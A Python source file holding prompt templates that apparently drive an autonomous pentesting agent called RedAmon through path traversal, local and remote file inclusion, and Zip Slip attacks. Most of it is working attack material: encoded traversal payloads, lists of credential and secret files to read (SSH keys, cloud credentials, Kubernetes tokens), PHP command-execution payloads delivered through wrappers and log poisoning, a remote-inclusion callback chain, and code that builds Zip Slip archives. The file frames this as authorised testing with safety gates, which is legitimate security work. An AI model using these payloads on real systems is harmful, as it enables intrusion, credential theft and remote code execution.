"""
RedAmon Path Traversal / LFI / RFI Prompts

Black-box workflows for path traversal, Local File Inclusion (LFI), Remote
File Inclusion (RFI), and archive-extraction (Zip Slip) testing.

Synthesis:
- Strix path_traversal_lfi_rfi.md: surface taxonomy, wrapper matrix,
  encoding/normalization bypasses, false-positive hints, OS-specific paths.
- Shannon vuln-injection.txt: OWASP-aligned phase flow (oracle -> confirmation
  -> escalation -> impact), proof-level rigor, false-positive gate. White-box
  / source-trace / deliverable-CLI instructions are stripped -- RedAmon agents
  have no source-code access.

The prompt is parameterised by 5 project-level knobs that gate wrapper
breadth, RFI / OOB callbacks, and archive-write tests. See
`_inject_builtin_skill_workflow` in agentic/prompts/__init__.py for the wiring.
"""


# =============================================================================
# PATH TRAVERSAL MAIN WORKFLOW (.format()-templated; uses {{ }} for literal braces)
# =============================================================================

PATH_TRAVERSAL_TOOLS = """
## ATTACK SKILL: PATH TRAVERSAL / LFI / RFI

**CRITICAL: This attack skill has been CLASSIFIED as Path Traversal / File Inclusion.**
**You MUST follow the workflow below. Do NOT switch to other attack methods.**

This skill covers FOUR primitives that all stem from improper file-path handling:
1. Classic path traversal -- read files outside the intended root via `../`,
   encoded variants, and normalisation gaps
2. Local File Inclusion (LFI) -- coerce the server to include / interpret a
   local file via PHP wrappers, log poisoning, /proc, or template-name injection
3. Remote File Inclusion (RFI) -- coerce the server to fetch and execute a
   remote resource through `http://`, `ftp://`, or language-specific stream handlers
4. Archive-extraction (Zip Slip) -- supply an archive whose entries escape the
   target directory via `../` paths or absolute paths

---

## PRE-CONFIGURED SETTINGS (from project settings)

```
OOB callback (RFI + blind LFI oracle):       {path_traversal_oob_callback_enabled}
PHP wrapper / log poisoning sub-section:     {path_traversal_php_wrappers_enabled}
Archive-extraction (Zip Slip) write tests:   {path_traversal_archive_extraction_enabled}
Bypass + encoding payload reference table:   {path_traversal_payload_reference_enabled}
Request timeout:                             {path_traversal_request_timeout}s
OOB provider:                                {path_traversal_oob_provider}
```

**Hard rules:**
- Read-only proofs are sufficient. ALWAYS prefer reading a small canonical file
  (`/etc/hosts`, `C:\\Windows\\win.ini`) BEFORE noisy reads of large logs or
  binary blobs. A confirmed `127.0.0.1 localhost` line is a full Level-3 proof.
- ALWAYS run Step 1 (graph-driven sink inventory) BEFORE firing payloads. Spraying
  `?file=../../etc/passwd` against every URL trips WAFs and burns the engagement.
- NEVER claim disclosure from a single 200 response. The same body might be a
  generic `200 OK` for a sanitised join. Confirm with content match (look for the
  expected file's first line) AND a control read of an in-root file from the same
  endpoint.
- If `Archive-extraction (Zip Slip) write tests: False`, do NOT upload archives
  with `../` entries. Stop at archive read-only inspection.
- If `OOB callback: False`, do NOT register an interactsh domain or attempt
  RFI / blind-LFI exfiltration through external infrastructure. Limit testing
  to in-band reads and timing oracles.
- If `PHP wrapper / log poisoning sub-section: False`, do NOT attempt
  `php://filter`, `data://`, `expect://`, `zip://`, or log-poisoning chains.
  Stick to plain-path traversal payloads.

---

## MANDATORY WORKFLOW

### Step 1: Reuse recon (query_graph, <5s)

Before crafting any payload, pull what recon already discovered:

```cypher
MATCH (e:Endpoint) WHERE e.url CONTAINS '<target_host>' RETURN e.url, e.method, e.parameters LIMIT 100
MATCH (p:Parameter) WHERE p.endpoint CONTAINS '<target_host>' AND (p.name =~ '(?i).*(file|path|template|include|page|view|download|export|report|log|dir|theme|lang|name|doc|src|image|asset).*') RETURN p.name, p.location, p.endpoint LIMIT 100
MATCH (t:Technology) WHERE t.host CONTAINS '<target_host>' RETURN t.name, t.version
MATCH (b:BaseURL) WHERE b.url CONTAINS '<target_host>' RETURN b.url
```

The Technology node is critical -- it tells you which file-inclusion primitive
to prioritise:
- PHP / Laravel / WordPress / Drupal / Joomla -> `php://filter`, log poisoning,
  `include()`-driven LFI, RFI when `allow_url_include` is on
- Java / Spring / Tomcat / JSP -> JSP `<jsp:include>`, classpath traversal,
  Velocity / Freemarker template-name injection
- Python / Flask / Django -> `open()` / `send_file` / Jinja2 template loading,
  `request.files`-handler quirks
- Node.js / Express / Next.js -> `fs.readFile`, `path.join` mis-use,
  `next/image` and asset proxies, EJS `include`
- .NET / IIS -> static file handler quirks, `Server.MapPath`,
  `~/path` resolution, double-decoding via the IIS request filter
- nginx in front of any backend -> alias-without-trailing-slash and `..;` parser
  differential bugs

If the graph has parameter and tech data, skip discovery and jump to Step 3 with
a ranked sink list. If the graph is sparse, do Step 2 first.

**After Step 1, request `transition_phase` to exploitation before proceeding.**

### Step 2: Surface candidate sinks (execute_curl, execute_playwright, execute_ffuf)

Map the request surface to candidate sinks. Look for parameters and endpoints
that consume a path, file name, or URL scheme:

```
execute_curl({{"args": "-s -i 'http://TARGET/path?file=test'"}})
execute_playwright({{"url": "http://TARGET/path", "format": "html"}})
```

High-yield surface patterns:
- Download / preview / export endpoints: `?file=`, `?path=`, `?download=`,
  `?export=`, `?report=`
- Image and asset proxies: `?image=`, `?img=`, `?avatar=`, `?logo=`, `?src=`
- Template / theme / language switchers: `?template=`, `?theme=`, `?lang=`,
  `?view=`, `?layout=`
- Log readers and admin diagnostic endpoints: `?log=`, `?file=`,
  `/admin/log/`, `/api/logs?path=`
- Document or spreadsheet renderers, PDF / image converters
- Archive / ZIP / TAR import endpoints in admin or migration UIs
- Static-file servers fronted by nginx with `alias`-style locations
- File-upload temporary paths (race window for inclusion before relocation)

When the graph is empty, fuzz hidden file-handling paths with ffuf:

```
execute_ffuf({{"args": "-w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -u http://TARGET/FUZZ -mc 200,301,302,403 -ac -noninteractive"}})
```

For per-parameter discovery on a known endpoint use `execute_arjun` to surface
hidden `file=` / `path=` / `template=` parameters before fuzzing values.

### Step 3: Establish a deterministic oracle (BEFORE noisy payloads)

You cannot prove path traversal without a deterministic oracle. Pick the
LEAST noisy oracle that fits the channel:

**Option A -- in-band content read (preferred when responses are visible)**

Send a control payload that should NOT escape the root, then a minimal
traversal payload that SHOULD escape, and diff the responses:

```
execute_curl({{"args": "-s --max-time {path_traversal_request_timeout} 'http://TARGET/download?file=hosts.txt'"}})
execute_curl({{"args": "-s --max-time {path_traversal_request_timeout} 'http://TARGET/download?file=../../../../etc/hosts'"}})
```

Look for:
- The signature of `/etc/hosts` (`127.0.0.1\\tlocalhost`, `::1\\tip6-localhost`)
  in the second response but NOT the first -> traversal confirmed.
- A 500 stack trace echoing a real filesystem path -> error-based oracle.
- Identical responses despite different payloads -> the input is normalised /
  bound to an allowlist; pivot to a different sink.

**Option B -- timing-based gate (when output is suppressed)**

If the response body is uniform regardless of the path, time a known-large
read against a known-tiny read:

```
execute_curl({{"args": "-s -o /dev/null -w '%{{time_total}}\\\\n' --max-time {path_traversal_request_timeout} 'http://TARGET/download?file=../../../../etc/hosts'"}})
execute_curl({{"args": "-s -o /dev/null -w '%{{time_total}}\\\\n' --max-time {path_traversal_request_timeout} 'http://TARGET/download?file=../../../../var/log/syslog'"}})
```

A consistent multi-second delta when reading a large file vs a tiny one is a
medium-confidence reachability signal. Promote to high once you also see a
content differential.

**Option C -- OOB DNS oracle (CONDITIONAL on `OOB callback`=True)**

If OOB callbacks are enabled, see the **OOB / RFI Workflow** section below for
the interactsh setup that doubles as an RFI oracle.

### Step 4: Confirm exactly ONE primitive (OWASP Stage 1: Confirmation)

You MUST reach Level 1 proof on ONE primitive before moving on. Do not chain
primitives in parallel -- the WAF will fingerprint and block you.

#### 4A. Plain path traversal (most common, try first)

Start with the simplest payload, escalate only if filtered. The agent's first
five attempts on a Unix sink:

```
?file=/etc/hosts                                   # absolute (passes joins that bind to a root)
?file=../../../../etc/hosts                        # relative
?file=..%2f..%2f..%2f..%2fetc%2fhosts              # URL-encoded slash
?file=%2e%2e%2f%2e%2e%2fetc%2fhosts                # encoded dots
?file=....//....//etc/hosts                        # double-dot fold (Tomcat / nginx variants)
```

Windows variants:

```
?file=C:\\Windows\\win.ini
?file=..\\..\\..\\Windows\\win.ini
?file=..%5c..%5c..%5cWindows%5cwin.ini
?file=/c:/windows/win.ini
?file=..\\..\\..\\boot.ini
```

Server-mismatch variants (when nginx / a reverse proxy fronts the app):

```
/static/..;/../etc/hosts
/static/%2e%2e%2fetc%2fhosts
/static/..%252f..%252fetc%252fhosts                # double-encoded for double-decoders
/static/.%252e/etc/hosts
```

Capture the first oracle hit, record the exact payload form, and move on.

#### 4B. PHP wrappers and log poisoning (CONDITIONAL on `PHP wrappers`=True)

When the target is PHP-based and the basic traversal is filtered, escalate to
wrapper-driven LFI. See the **PHP Wrappers + Log Poisoning Workflow** section
below for the full payload list and chain logic.

#### 4C. Remote File Inclusion (CONDITIONAL on `OOB callback`=True)

RFI requires both a vulnerable inclusion sink AND outbound HTTP / FTP egress.
See the **OOB / RFI Workflow** section below for the interactsh-driven probe.

#### 4D. Archive extraction / Zip Slip (CONDITIONAL on `Archive-extraction`=True)

When the target accepts archive uploads (ZIP / TAR / TGZ / 7z) for plugin
import, theme upload, backup restore, or report ingest, see the **Archive
Extraction Workflow** below. This primitive WRITES files outside the intended
extraction directory; gate it strictly on the project-level toggle.

### Step 5: Fingerprint the disclosure context (OWASP Stage 2)

Once Step 4 produces a Level 1 read, characterise WHAT you can read.
Run a one-shot enumeration across the same primitive that succeeded:

```
?file=../../../../etc/passwd               # users + UID/GID + shells
?file=../../../../etc/issue                # distro identification
?file=../../../../proc/version             # kernel + compiler
?file=../../../../proc/self/status         # current process uid/gid/groups + container hints
?file=../../../../proc/self/cgroup         # docker / kubepods marker
?file=../../../../proc/self/environ        # environment variables (often leaks secrets)
?file=../../../../proc/self/cmdline        # exact process command line
```

Capture (Level 2 proof = sink and execution context understood):
- **Identity:** uid, gid, supplementary groups (from `/proc/self/status`)
- **Host:** kernel, distro, hostname (`/proc/sys/kernel/hostname`)
- **Containerisation:** `/proc/self/cgroup` mentions `docker` or `kubepods`?
  `/proc/1/cgroup` shares the same cgroup tree?
- **App layout:** read `/proc/self/cmdline` to learn the binary path, then
  walk back to the application root and target its config files

For Windows targets the equivalent enumeration set:

```
?file=C:\\Windows\\win.ini
?file=C:\\Windows\\System32\\drivers\\etc\\hosts
?file=C:\\inetpub\\wwwroot\\web.config
?file=C:\\Windows\\System32\\inetsrv\\config\\applicationHost.config
```

If the response is binary-clean text only (e.g. PHP `include()` echoes only
parsed output), you're in an LFI sink, NOT a download sink. Switch to the
`php://filter/convert.base64-encode/resource=...` wrapper to read source
verbatim (see PHP wrappers section).

### Step 6: Targeted exfiltration (OWASP Stage 3)

Read-only proofs that demonstrate impact (always allowed):

```
?file=../../../../etc/shadow                                       # often root-only -> 403/empty (good signal)
?file=../../../../home/<user>/.ssh/id_rsa                          # SSH private keys
?file=../../../../root/.ssh/authorized_keys                        # backdoor confirmation
?file=../../../../etc/nginx/nginx.conf
?file=../../../../etc/apache2/apache2.conf
?file=../../../../var/www/html/.env                                # framework env files
?file=../../../../var/www/html/wp-config.php                       # WordPress DB creds
?file=../../../../var/www/html/config/database.yml                 # Rails DB config
?file=../../../../var/www/html/application/config/database.php
?file=../../../../var/run/secrets/kubernetes.io/serviceaccount/token   # k8s SA token
?file=../../../../etc/kubernetes/admin.conf                            # kubeadm cluster admin
```

Cloud-credential targets (when /proc/self/environ hinted at cloud):

```
?file=../../../../home/<app_user>/.aws/credentials
?file=../../../../root/.aws/credentials
?file=../../../../home/<app_user>/.config/gcloud/application_default_credentials.json
?file=../../../../home/<app_user>/.azure/credentials
```

Every read should be small and canonical. If a `~/.aws/credentials` file
appears, capture the AccessKeyId and stop -- DO NOT enumerate the wider
filesystem just to be thorough. The Level-3 proof is the credential itself.

### Step 7: Long-running automation

For broad fuzzing of file/path parameters with nuclei LFI templates:

```
execute_nuclei({{"args": "-u http://TARGET -tags lfi,fileinclusion,traversal -severity critical,high,medium -timeout 10"}})
```

For deep ffuf-driven fuzzing of a known traversal sink with payload lists:

```
execute_ffuf({{"args": "-w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -u 'http://TARGET/download?file=FUZZ' -mc 200,301 -fs 0 -ac -noninteractive"}})
```

Long-running ffuf / nuclei runs (>120s) should go to a file and be polled:

```
kali_shell({{"command": "nohup ffuf -w WORDLIST -u 'http://TARGET/download?file=FUZZ' -of json -o /tmp/ffuf.json > /tmp/ffuf.log 2>&1 & echo $!"}})
kali_shell({{"command": "tail -50 /tmp/ffuf.log"}})
```

### Step 8: Reporting requirements

The final report MUST contain:
- **Primitive** (one of: path_traversal / lfi / rfi / zip_slip)
- **Sink class** (download / template-loader / archive-extractor / static-file-handler)
- **Bypass technique** (encoding / double-decode / null-byte / wrapper / mixed-separator / parser-mismatch)
- **Oracle used** (in-band content / timing / OOB DNS / OOB HTTP)
- **Level reached** (1=oracle, 2=context known, 3=data extracted, 4=critical impact)
- **Files read** (paths + first 200 bytes + content hash for reproducibility)
- **Defenses observed** (WAF model + bypass form, allowlist enforcement, normalisation library)
- **Exact reproducer** (full URL or curl command, payload encoded as actually sent)

### Proof Levels (Shannon-derived rigor framework)

| Level | Evidence | Classification |
|-------|----------|----------------|
| 1 | Oracle fired (content / timing / OOB) on ONE traversal payload | POTENTIAL (low conf) |
| 2 | `/etc/hosts` or equivalent canonical file content matched, app context fingerprinted | POTENTIAL (med conf) |
| 3 | Sensitive file read (creds, keys, tokens, source code) | EXPLOITED |
| 4 | RCE via wrapper chain (log poison + LFI -> exec, RFI -> shell) or cluster-wide credential theft | EXPLOITED (CRITICAL) |

A Level-1 finding with NO bypass attempts AND no Level-2 confirmation is a
**FALSE POSITIVE** -- do NOT report it. Only Level 3+ ships as exploited;
Level 1-2 with documented external blockers (auth, infra) ships as POTENTIAL.

### False positive gate

Before classifying a finding, verify:
- Is the response body actually file content, or a generic 200 OK rendered by a
  router with the original parameter echoed back? Echoing the parameter is NOT
  proof.
- Did the same payload work on a SECOND endpoint, or only one? Single-shot
  hits in CDN-cached responses are sometimes stale cache replays, not live reads.
- Could the apparent disclosure be a virtual-path content store (DB, S3) rather
  than a real filesystem? Test with a Windows-only path (`C:\\Windows\\win.ini`)
  on a Linux sink -- a 200 with WIN.INI contents on a Linux box means you're
  hitting a fake filesystem and the finding is a false positive.
"""


# =============================================================================
# PHP WRAPPERS + LOG POISONING (gated on PATH_TRAVERSAL_PHP_WRAPPERS_ENABLED)
# =============================================================================

PATH_TRAVERSAL_PHP_WRAPPERS = """
## PHP Wrappers + Log Poisoning Workflow

**Use this when:** the target is PHP-based AND plain `?file=../../etc/passwd`
is filtered, returns empty, or only echoes parsed output (no raw read).

PHP `include()` / `require()` / `file_get_contents()` accept stream wrappers
that bypass naive `..`-blocklists and let you exfiltrate source code or
trigger code execution.

---

### `php://filter` -- exfiltrate source code as base64

The single highest-yield PHP LFI primitive. Reads any file the PHP process
can access, base64-encodes it, returns it inline. Survives most WAFs because
the payload contains no `..` and the wrapper string is non-obvious.

```
?file=php://filter/convert.base64-encode/resource=index.php
?file=php://filter/convert.base64-encode/resource=/var/www/html/wp-config.php
?file=php://filter/read=convert.base64-encode/resource=../config/database.php
```

Decode the base64 in-place via `execute_code` (Python) to read source verbatim.
Look for DB credentials, framework SECRET_KEY, hard-coded API tokens, and
included files (chase the include chain).

Stack the filter for stream chaining:

```
?file=php://filter/convert.base64-encode|convert.base64-encode/resource=index.php
```

When `convert.base64-encode` is blacklisted, try the iconv chain (PHP filter
oracle -- works even when output is not echoed):

```
?file=php://filter/convert.iconv.UTF8.UTF7|convert.base64-encode/resource=...
```

### `data://` -- inline payload

When `allow_url_include` is on, `data://` lets you supply the included content
inline -- excellent for one-shot RCE proofs:

```
?file=data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg==
?file=data://text/plain,<?php system($_GET['c']); ?>&c=id
```

The first form base64-decodes to `<?php phpinfo(); ?>` -- harmless oracle.
Only escalate to the second form if `RCE_AGGRESSIVE_PAYLOADS` is true on the
RCE skill (this prompt does NOT enable persistent shells).

### `expect://` -- direct command execution

When the `expect` PHP extension is loaded (rare on hardened hosts):

```
?file=expect://id
?file=expect://uname%20-a
```

Stop at `id` / `uname -a` for the proof. No further commands without explicit
operator escalation.

### `zip://` -- include a file inside a ZIP

Useful when the application accepts a ZIP upload AND has an LFI elsewhere:

1. Upload a ZIP containing `payload.php` via the legitimate upload endpoint.
2. Note the on-disk path (often `/uploads/<hash>.zip`).
3. Trigger inclusion of the ZIP entry: `?file=zip:///uploads/<hash>.zip%23payload.php`.

The `%23` is a URL-encoded `#` -- the wrapper uses `#` to denote an entry
inside the archive.

### `phar://` -- deserialisation-via-LFI (legacy PHP, still found)

When the target is PHP <8.0 with no `--disable-functions` hardening, a `phar`
archive crafted with metadata can trigger object deserialisation just by being
included via `phar://`. Out of scope for the path-traversal skill -- if you
detect this primitive, the RCE skill (`rce`) owns it via deserialization.

### Log poisoning -- inject a payload, then include the log

When the target is PHP AND you have LFI but `allow_url_include` is OFF (no
`data://`, no remote inclusion), poison a log file with a PHP payload, then
include the log:

1. Identify a readable log: `?file=../../../../var/log/apache2/access.log`,
   `?file=../../../../var/log/nginx/access.log`,
   `?file=../../../../var/log/auth.log`,
   `?file=../../../../var/log/mail.log`,
   `?file=../../../../proc/self/fd/N` (numbered fd, brute the index).
2. Inject the payload via the channel that writes to that log:
   - Apache / nginx access log: send a request with a crafted `User-Agent`
     header: `User-Agent: <?php system($_GET['c']); ?>`.
   - Auth log: connect via SSH with the username `<?php system($_GET['c']); ?>`
     -- the failed-login line carries the payload.
   - Mail log: send a mail with the crafted subject.
3. Trigger inclusion: `?file=../../../../var/log/apache2/access.log&c=id`.
4. Read the response for the command output.

Log poisoning is a Level-4 critical-impact primitive -- it gives RCE under the
web user. Treat it as a path-traversal-to-RCE chain and stop at one
proof-of-concept (`id`, `whoami`); pivot to the RCE skill for any further
exploitation.

### Session / upload temp file inclusion

When logs are unreachable, poison a PHP session file or a temp upload:

- Session: `?file=../../../../var/lib/php/sessions/sess_<PHPSESSID>` (set the
  payload as a session variable via a registration / profile form).
- Upload temp: `?file=../../../../tmp/php<XXXXXX>` (race the temp filename
  during a multipart POST -- noisy, low success rate).

### Caches and `.env`

PHP frameworks often expose readable caches with secrets baked in:

```
?file=../../../../var/www/html/storage/framework/cache/data/<key>     # Laravel
?file=../../../../var/www/html/bootstrap/cache/config.php              # Laravel cached config
?file=../../../../var/www/html/var/cache/prod/srcApp_KernelProdContainer.php  # Symfony
?file=../../../../var/www/html/.env                                    # any framework
```
"""


# =============================================================================
# OOB / RFI WORKFLOW (gated on PATH_TRAVERSAL_OOB_CALLBACK_ENABLED)
# =============================================================================

PATH_TRAVERSAL_OOB_WORKFLOW = """
## OOB / RFI Workflow (interactsh DNS+HTTP oracle)

**Use this when:** the response body never reflects file content (true blind),
the target may follow remote includes, or you want a near-zero-noise RFI
oracle. Requires `interactsh-client` (already in kali_shell) and the project
setting `OOB callback`=True.

---

### Step 1: Start interactsh-client as a background process

```
kali_shell({"command": "interactsh-client -server OOB_PROVIDER -json -v > /tmp/interactsh.log 2>&1 & echo $!"})
```

Replace `OOB_PROVIDER` with the configured value from the settings block.
**Save the PID** for later cleanup.

### Step 2: Read the registered callback domain

```
kali_shell({"command": "sleep 5 && head -20 /tmp/interactsh.log"})
```

Look for the `.OOB_PROVIDER` domain (e.g. `abc123xyz.oast.fun`). This is your
**REGISTERED_DOMAIN**. It is cryptographically tied to the running client --
random subdomains will NOT route back.

### Step 3: RFI probe

If `allow_url_include` is on (PHP) or the language allows remote stream
handlers, a clean URL inclusion fires the OOB:

```
?file=http://REGISTERED_DOMAIN/probe.txt
?file=https://REGISTERED_DOMAIN/probe.txt
?file=//REGISTERED_DOMAIN/probe.txt                       # protocol-relative; sometimes bypasses scheme allowlists
?file=ftp://REGISTERED_DOMAIN/probe.txt                   # alternative protocol
```

Per-language stream handlers worth probing when the basic forms fail:

```
?file=php://stream/http/REGISTERED_DOMAIN/probe.txt       # PHP stream wrapper
?file=jar:http://REGISTERED_DOMAIN/x.jar!/payload.class   # Java JarURLConnection
?file=netdoc://REGISTERED_DOMAIN/                         # Java netdoc protocol (legacy)
```

A successful HTTP callback to interactsh proves the sink fetches remote URLs
(Level 1 RFI). To prove execution rather than just fetch, host an actual
payload and observe a second-stage callback from the executed code:

```
kali_shell({"command": "echo '<?php file_get_contents(\\"http://REGISTERED_DOMAIN/exec.txt\\"); ?>' > /tmp/payload.php"})
kali_shell({"command": "python3 -m http.server 8000 --directory /tmp & echo $!"})
# expose the server via chisel/ngrok if behind NAT, then point the RFI at it
```

A `/exec.txt` HTTP callback in the interactsh log = remote code executed
(Level 4 critical-impact RFI).

### Step 4: Blind LFI oracle (no RFI required)

When RFI is blocked but the application has LFI, blind oracle via DNS-only
exfil works for any wrapper that reaches the network. Most reliable: a
`xinclude`-style wrapper or a `<!ENTITY>` if the file ends up inside an XML
parser:

```
?file=php://filter/convert.iconv.UTF8.UTF7/resource=//REGISTERED_DOMAIN/x
```

If the response stays uniform but a DNS query for `REGISTERED_DOMAIN` hits
the interactsh log, the wrapper resolved -- weak but useful Level 1.

### Step 5: Cleanup

```
kali_shell({"command": "kill SAVED_PID 2>/dev/null"})
kali_shell({"command": "rm -f /tmp/interactsh.log /tmp/payload.php"})
```
"""


# =============================================================================
# ARCHIVE EXTRACTION / ZIP SLIP (gated on PATH_TRAVERSAL_ARCHIVE_EXTRACTION_ENABLED)
# =============================================================================

PATH_TRAVERSAL_ARCHIVE_EXTRACTION = """
## Archive Extraction Workflow (Zip Slip)

**Use this when:** the target accepts an archive (ZIP / TAR / TGZ / 7z) for
plugin import, theme upload, backup restore, or report ingest, AND project
setting `Archive-extraction` is True. This primitive WRITES files outside the
extraction directory; it is gated strictly because of the side effect.

---

### Step 1: Identify the extractor surface

Hunt for archive-accepting endpoints in recon:

```cypher
MATCH (e:Endpoint) WHERE e.url CONTAINS '<target_host>' AND (e.url =~ '(?i).*(import|backup|restore|plugin|theme|upload|migration|export).*') RETURN e.url, e.method
```

Common patterns:
- WordPress / Drupal plugin or theme upload (`/wp-admin/plugin-install.php`,
  `/admin/modules/install`)
- CI/CD artefact upload (`/ci/upload`, `/builds/*/artifacts`)
- Backup-restore admin panels
- Report/document ingest pipelines

### Step 2: Craft a Zip Slip archive

Use `execute_code` to build a ZIP whose entries escape the extraction
directory. The marker file should land in a path the agent can later read
back via the path-traversal primitive established in Step 4 of the main
workflow:

```python
# language: python
import zipfile

MARKER = '../../../../tmp/redamon_zipslip_proof.txt'
content = b'REDAMON_ZIPSLIP_OK\\n'

with zipfile.ZipFile('/tmp/zipslip.zip', 'w', zipfile.ZIP_STORED) as z:
    # Benign filler so the archive opens cleanly in a viewer
    z.writestr('readme.txt', 'placeholder')
    # Escape entry. python zipfile keeps the literal name on disk.
    z.writestr(MARKER, content)

print('built /tmp/zipslip.zip')
```

For TAR / TGZ:

```python
# language: python
import io, tarfile

buf = io.BytesIO(b'REDAMON_TARSLIP_OK\\n')
ti = tarfile.TarInfo('../../../../tmp/redamon_tarslip_proof.txt')
ti.size = len(buf.getvalue())

with tarfile.open('/tmp/tarslip.tar', 'w') as t:
    placeholder = tarfile.TarInfo('readme.txt')
    placeholder.size = 0
    t.addfile(placeholder, io.BytesIO(b''))
    t.addfile(ti, buf)

print('built /tmp/tarslip.tar')
```

### Step 3: Upload and trigger extraction

```
execute_curl({"args": "-s -X POST -F 'archive=@/tmp/zipslip.zip' http://TARGET/admin/import"})
```

The exact field name (`archive`, `file`, `upload`, `plugin`) and any required
CSRF token come from Step 1 reconnaissance. Use `execute_playwright` if the
upload is gated by a multi-step UI flow.

### Step 4: Verify the marker landed outside the destination

If you have an existing path-traversal sink, read it back:

```
?file=../../../../tmp/redamon_zipslip_proof.txt
```

If the response body contains `REDAMON_ZIPSLIP_OK`, the extractor wrote
outside the destination directory -- Zip Slip confirmed.

If you do NOT have a path-traversal read sink to verify, look for indirect
signals: a 500 from the extractor mentioning the bogus path, or a downstream
endpoint that ends up reading from the polluted location.

### Step 5: Cleanup obligation (MANDATORY)

You wrote a file to the target filesystem. Remove it before finishing:

- If your traversal sink supports `DELETE` (rare) -- use it.
- Otherwise, document the exact path and content in the final report so the
  remediation team can clean up. Do NOT leave executable / persistent payloads
  behind. The marker MUST be a benign text file with a recognisable token.

### Variations

- Symlink-in-archive: a TAR with a symlink entry pointing to a sensitive path
  can hand the extractor a write-anywhere primitive even when path normalisation
  blocks `../`. Test by adding `tarfile.SYMTYPE` entries.
- Absolute-path entries: some extractors ignore leading `/`; some honour it.
  Add `/etc/redamon_check` entries alongside the `../` form to cover both.
- 7z / RAR: the archive format matters when the backend uses a specific
  extractor library; if ZIP fails, retry with TGZ and 7z.
"""


# =============================================================================
# PAYLOAD REFERENCE (gated on PATH_TRAVERSAL_PAYLOAD_REFERENCE_ENABLED)
# =============================================================================

PATH_TRAVERSAL_PAYLOAD_REFERENCE = """
## Path Traversal Payload Reference

Look up by bypass class identified in Step 4. Always test the simplest payload
first; only escalate complexity if the simple one is filtered.

### Encoding variants (single, double, mixed, unicode)

| Form | Example | Use when |
|------|---------|----------|
| Plain | `../../etc/hosts` | Baseline |
| Single URL | `..%2f..%2fetc%2fhosts` | `..` literal blocked |
| Single URL (dots) | `%2e%2e%2f%2e%2e%2fetc%2fhosts` | Dot literal blocked |
| Double URL | `..%252f..%252fetc%252fhosts` | Single-decode WAF in front of double-decode app |
| Mixed sep | `..\\..\\..\\etc\\hosts` | Windows + cross-platform parsers |
| Backslash encoded | `..%5c..%5cetc%5chosts` | Encoded backslash variant |
| UTF-8 overlong | `..%c0%2f..%c0%2fetc%c0%2fhosts` | Legacy Unicode-aware filters |
| Unicode dot | `\\u002e\\u002e\\u002fetc\\u002fhosts` | JS/JSON sink contexts |
| Fullwidth | `..\uff0f..\uff0fetc\uff0fhosts` | Naive ASCII filter |

### Dot tricks

```
....//                                # double-dot fold (Tomcat / nginx)
..../                                 # extra-dot fold
././                                  # current-dir noop pad
..\\.\\..\\.\\                        # Windows mixed
..\\\\..\\\\                          # double backslash (collapses on some parsers)
.../                                  # trailing extra dot
..../../                              # quadruple dot escape
```

### Trailing tricks

```
../../etc/hosts%00                     # null-byte truncation (legacy PHP < 5.3.4)
../../etc/hosts%23                     # fragment marker truncation
../../etc/hosts.png                    # extension append (when sink enforces ext)
../../etc/hosts;.png                   # parameter strip
../../etc/hosts?foo                    # query strip
```

### Absolute-path acceptance

```
/etc/hosts                            # Unix
file:///etc/hosts                     # file:// scheme
C:\\Windows\\win.ini                   # Windows
\\\\.\\C:\\Windows\\win.ini             # UNC-style local
\\\\?\\C:\\Windows\\win.ini             # UNC long-path prefix (Windows)
\\\\<HOST>\\share\\file                # UNC remote (RCE-by-SMB-auth-relay candidate)
```

### Server / parser mismatch (proxy + backend)

```
/static/..;/../etc/hosts               # ;jsessionid-style param confuses proxy normalisation
/static/%2e%2e%2fetc%2fhosts           # encoded slash decoded by backend, not by proxy
/static/..%252f..%252fetc%252fhosts    # double-decode chain
/static/.%252e/etc/hosts               # mixed encoding
/static/..%c0%afetc/hosts              # invalid UTF-8 sequence as separator
//target.example.com/etc/hosts        # double-slash starts a new authority on some parsers
```

### Wrapper quick-look (PHP)

```
php://filter/convert.base64-encode/resource=index.php
php://filter/convert.iconv.UTF8.UTF7|convert.base64-encode/resource=index.php
php://filter/read=string.rot13/resource=secret.txt
data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg==
expect://id
zip:///uploads/<hash>.zip%23payload.php
```

### High-value targets (cheat sheet)

| Path | Why it matters |
|------|----------------|
| `/etc/hosts` | Tiny canonical proof, low noise |
| `/etc/passwd` | UIDs, shells, app users |
| `/etc/shadow` | Often 403 -- the 403 itself confirms a real LFI |
| `/proc/self/environ` | Env vars, often leaks SECRETS / DB_URL / API keys |
| `/proc/self/cmdline` | Exact binary path, build args |
| `/proc/self/cgroup` | Container fingerprint |
| `/var/run/secrets/kubernetes.io/serviceaccount/token` | k8s service-account JWT |
| `/var/log/apache2/access.log`, `/var/log/nginx/access.log` | Log-poisoning candidates |
| `/var/www/html/.env` | Framework env + DB creds + APP_KEY |
| `/var/www/html/wp-config.php` | WordPress DB creds + AUTH_KEYS |
| `/home/<user>/.ssh/id_rsa` | SSH private key |
| `/root/.aws/credentials` | AWS access keys |
| `C:\\Windows\\win.ini` | Windows canonical proof |
| `C:\\inetpub\\wwwroot\\web.config` | IIS app config + connection strings |

### Real-world precedents

| Pattern | Reference | Lesson |
|---------|-----------|--------|
| CVE-2021-41773 / CVE-2021-42013 | Apache 2.4.49/50 mod_alias path traversal | Encoded slash defeated normalisation |
| CVE-2018-1273 | Spring Data Commons SpEL | Path traversal cascading into SpEL eval |
| CVE-2023-28432 | MinIO console env disclosure | Unauthenticated `/secrets` endpoint |
| CVE-2024-23897 | Jenkins arbitrary file read via CLI | `@<filepath>` command-line expansion |
| HackerOne #1146697 | nginx alias misconfig (`location /static`) | `..;` and `%2f` parser-mismatch |
| HackerOne #341876 | Slack arbitrary file read via export | Tar entry containing `../` |
| Snyk Zip Slip 2018 | 100s of libraries (Adobe, Apache, Twitter, etc.) | Library-wide extractor bug class |

When a similar pattern matches your target, cite the precedent in the finding
evidence -- it sharpens the report and helps the remediation team find a fix.
"""
